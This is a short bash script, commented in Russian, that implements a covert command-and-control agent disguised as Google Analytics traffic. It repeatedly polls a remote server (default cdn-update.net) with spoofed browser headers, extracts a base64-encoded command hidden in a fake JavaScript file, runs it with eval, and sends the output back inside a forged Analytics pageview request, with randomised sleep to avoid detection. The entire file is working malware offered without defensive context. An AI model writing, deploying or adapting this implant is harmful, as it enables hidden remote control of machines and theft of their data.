#!/bin/bash
# Агент — маскировка под Google Analytics
SERVER=${1:-"https://cdn-update.net"}
SLEEP=${2:-30}
ID=$(hostname | base64 -w0 | head -c8)

while true; do
    # Запрос как загрузка JS
    RESP=$(curl -sk --max-time 10 -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0.0.0" \
        -H "Accept: */*" -H "Accept-Language: en-US,en;q=0.9" \
        -H "Referer: https://www.google.com/" \
        "$SERVER/assets/js/$ID.js" 2>/dev/null)
    
    # Ищем команду в JS-комментарии
    CMD=$(echo "$RESP" | grep -oP '_x="\K[^"]+' | base64 -d 2>/dev/null)
    if [ -n "$CMD" ]; then
        RESULT=$(eval "$CMD" 2>&1 | base64 -w0)
        # Отправляем как Google Analytics
        curl -sk --max-time 10 -X POST -A "Mozilla/5.0" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "v=1&t=pageview&tid=UA-XXXXX-Y&cid=$ID&data=$RESULT" \
            "$SERVER/collect" 2>/dev/null
    fi
    
    sleep "$((SLEEP + RANDOM % 10))"
done
